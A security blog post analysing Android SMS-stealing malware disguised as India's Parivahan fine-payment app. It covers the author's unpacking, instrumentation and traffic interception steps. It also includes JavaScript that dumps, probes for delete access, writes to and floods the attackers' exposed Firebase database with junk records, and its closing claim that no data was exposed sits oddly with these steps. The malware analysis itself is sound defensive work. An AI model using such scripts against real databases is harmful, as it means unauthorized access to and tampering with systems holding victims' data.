# Android Malware Analysis: Uncovering a Sophisticated Android Malware

## Introduction

What began as investigating a suspicious APK received via WhatsApp turned into discovering a sophisticated malware operation designed to steal SMS messages from victims. The attack started with a message from a fake number impersonating Parivahan (India's transport department), claiming I had violated road rules and needed to pay a fine through their app. Having previously written a blog about punishing scammer APKs, one of my friends forwarded this suspicious app to me for analysis. While the application closely resembled the official Parivahan interface, careful analysis revealed it was actually malware. This post walks through my analysis process, techniques used, and findings.

![whatsapp](https://i.ibb.co/Pzwky5P9/w.jpg)

> **Note:** This malware was capable of much more damage than just SMS harvesting, but I've focused on the primary functionality to avoid unnecessary complexity in this analysis.

## Initial Contact and Social Engineering

The attackers used a classic social engineering approach:
- Sent a WhatsApp message from an unknown number
- Claimed to represent the Parivahan department
- Alleged I had violated traffic rules
- Created urgency by demanding immediate payment of a fine
- Provided an apk to install their "official" app for processing the payment

The message contained just enough official-sounding language and urgency to potentially trick users into downloading the malicious application without verifying its authenticity.

## Initial Static Analysis

### APK Unpacking
The first step was unpacking the suspicious APK using apktool:

```bash
apktool d pari.apk -o pari
```

The files appeared heavily obfuscated, suggesting this wasn't the work of an amateur.

![unziped](https://i.ibb.co/wZ3Q69fX/unziped.png)

A particularly interesting discovery was an additional APK file named "childapp.apk" in the assets directory, indicating a potential multi-stage infection.

![kidapp](https://i.ibb.co/wZxPNHp5/childapp.png)

Upon further investigation of the child app:

![kidunziped](https://i.ibb.co/3yM0Qkhn/chilunziped.png)

### About Obfuscation
Obfuscation is a technique used by developers to make code difficult to understand, reverse engineer, or analyze. In legitimate apps, it protects intellectual property, but malware authors use it to evade detection and analysis. Common obfuscation techniques include:
- Renaming variables to meaningless names
- Encrypting strings and values
- Breaking logical flow of code
- Adding dummy code

The heavy obfuscation in this malware made static analysis challenging and indicated professional development.

### Decompilation Attempts
To analyze the code more effectively, I created a multithreaded bash script to decompile all DEX files using jadx:

```bash
#!/bin/bash
find . -name "*.dex" | xargs -P 8 -I{} jadx -d decompiled_{} {}
```

Despite decompilation, the code remained heavily obfuscated. I ran YARA rules looking for suspicious API calls, but found nothing conclusive due to the extensive obfuscation. At this point, static analysis had reached its limits.

## Dynamic Analysis

### Emulator Setup
I set up an Android emulator using a clean image and installed the suspicious APK. Initially, the app wouldn't launch due to sophisticated root detection mechanisms.

The app's icon and interface were meticulously crafted to mimic the official Parivahan app:

![pari](https://i.ibb.co/DPyyqW9s/icon.png)

### Frida Instrumentation
I used Frida to extract runtime information about the APK:

![frida](https://i.ibb.co/1tvcJH4s/uai.png)

The file "sjy.mutk.fvdghu.qama" was identified as the malware package name—deliberately nonsensical to avoid detection.

### Bypassing Root Detection
I used Objection to bypass the root detection mechanisms:

![root](https://i.ibb.co/nMJ1nrYz/root.png)

After bypassing root detection, I was able to launch the application.



### Cryptographic Function Analysis
Using a Frida script for inspecting AES operations, I monitored the app's encryption activities:

![enc](https://i.ibb.co/m5MnTPkG/frida-enc.png)

### Anti-Uninstallation Measures
When I attempted to uninstall the app, it actively interfered with the process:

![giv](https://i.ibb.co/FkN367Rh/uninstall.gif)

### Permission Requests
Upon installation, the app requested multiple sensitive permissions:
- SMS access
- Call logs access
- Storage access

### Secondary Payload Delivery
The app immediately displayed an "update required" prompt, confirming it was using a stager approach:

![update](https://i.ibb.co/jvgPXBcT/update.png)

### Understanding Stagers
A "stager" is an initial, lightweight malware component that establishes a foothold on the victim's device and then downloads or unpacks more powerful malware. This technique:
- Reduces initial detection risk (smaller, less suspicious first payload)
- Provides flexibility (can deliver different payloads to different victims)
- Creates persistence (even if the main malware is detected, the stager might remain)

In this case, the initial APK acted as a stager by containing and later activating "childapp.apk", the main payload.

After clicking "Update," it requested additional permissions:

![permission](https://i.ibb.co/S7HF59P4/c.png)

Most concerningly, it requested accessibility permissions:

![asses](https://i.ibb.co/ZzXwYm2n/b.png)

### Traffic Analysis
To intercept network traffic, I set up monitoring with Frida and Burp Suite. Surprisingly, the app made no immediate network requests. I suspected SSL certificate pinning and used Objection to disable it:

![ssl](https://i.ibb.co/7d54z998/ssl.png)

### What is SSL Pinning?
SSL pinning is a security technique where an app will only accept specific SSL certificates, rejecting all others—even those that would normally be trusted by the device. Legitimate apps use this to prevent man-in-the-middle attacks, but malware uses it to prevent traffic analysis. Bypassing SSL pinning was necessary to observe the malware's communications.

### The SMS Trigger
The breakthrough came when I simulated receiving an SMS:

![sms](https://i.ibb.co/Rp271Qk0/a.png)

Immediately after, the app began making network requests to a Firebase Realtime Database. I intercepted them using Burp Suite:

![firebase](https://i.ibb.co/svLfFBHH/burp.png)

## Identifying the Backend

### Firebase RTDB Discovery
The intercepted requests revealed an exposed Firebase Realtime Database URL. Using a JavaScript script, I queried the database:

```javascript
const fetch = require('node-fetch'); 

const url = 'https://exposed-default-rtdb.firebaseio.com/.json';

fetch(url)
  .then(res => res.json())
  .then(data => {
    console.log("Full Firebase DB:", data);
  })
  .catch(err => {
    console.error("Error fetching full DB:", err);
  });
```

This revealed thousands of user records containing stolen SMS messages , Contact numbers , screen shot links etc:

![data](https://i.ibb.co/wZbrjdvC/data.png)

### Testing Database Permissions
I attempted to delete data (which was fortunately blocked):

```javascript
fetch(url, {
  method: 'DELETE',
  headers: { 'Content-Type': 'application/json' }
})
.then(response => console.log('Delete response:', response.status))
.catch(error => console.error('Error:', error));
```

However, I discovered write access was enabled, allowing me to insert data:

```javascript
fetch(url, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    "phone": "TEST_SECURITY_ALERT",
    "message": "YOUR_DATABASE_IS_EXPOSED",
    "timestamp": new Date().toISOString()
  })
})
.then(response => console.log('Write response:', response.status))
.catch(error => console.error('Error:', error));
```

### Disrupting the Operation
To mitigate the impact, I wrote a script to insert junk data into the database :

> **Note** : The actual script was meant to insert fake picture links, rickroll videos, fake texts, and more, but I’ve only shown SMS insertion here.
```javascript
const fetch = require('node-fetch');
const { faker } = require('@faker-js/faker');
const url = 'https://exposed-default-rtdb.firebaseio.com/.json';
(async () => {
  console.log("Inserting junk data...");
  for (let i = 1; i <= 5; i++) {
    const data = {
      info: `Operator : mobinet, Number : ${faker.phone.number('+91##########')}`,
      message: faker.lorem.sentences(2),
      sender: faker.company.name(),
      time: faker.date.past().toISOString()};
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)});
      if (res.ok) {
        console.log(`Inserted ${i}:`, data);
      } else {
        console.error(`Failed ${i}: HTTP ${res.status}`);}
    } catch (e) {
      console.error(`Error ${i}:`, e.message);}}
  console.log("Done!");})();
```

Output of the junk data insertion:

![inject](https://i.ibb.co/JRBpsDq1/inject.png)

## Conclusion

This malware represents a sophisticated SMS harvesting operation using multiple advanced techniques:
- Multi-stage infection with a stager approach
- Heavy code obfuscation
- Root detection to evade analysis
- SSL pinning to protect network communications
- Trigger-based exfiltration (only activating when SMS is received)
- Anti-uninstallation mechanisms

The exposed Firebase RTDB instance containing thousands of records indicates this was an active and successful campaign affecting many users.

While the malware is capable of much more, I’ve chosen to omit those capabilities in this blog to keep it understandable and focused.
### Protective Measures


- **Avoid installing apps** from unknown sources or links received in messages.  
- **Most government agencies** will **never send APK files** directly or ask you to install apps outside the **Google Play Store or Apple App Store**.  
- **Verify official communications** through legitimate government websites or hotlines.  
- **Review app permissions** carefully before granting access to your data or device functions.  
- **Use trusted mobile security solutions** that can detect and block malicious applications.  
- **Stay alert** to unexpected messages demanding fines, fees, or personal information—these are often scams.

*Note: This post is intended for educational purposes. All discovered vulnerabilities were responsibly reported, and no actual user data was manipulated or exposed.*